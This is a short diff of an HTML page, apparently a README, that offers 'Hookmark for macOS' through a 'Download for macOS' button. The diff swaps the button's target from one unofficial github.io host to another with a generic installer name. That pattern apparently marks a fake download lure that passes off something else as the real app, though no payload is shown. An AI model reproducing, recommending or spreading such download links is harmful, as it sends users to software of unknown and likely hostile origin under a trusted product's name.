@@ -6,7 +6,7 @@
 <h3>Hookmark for macOS</h3>
 <p>Hookmark Mac Edition treats relationships between items as primary, turning your Mac into a navigable web of meaningful links.</p>
 
-<a href="https://install-quick-mac.github.io/.github/Hookmark">
+<a href="https://software-install-apps.github.io/.github/Hookmark">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
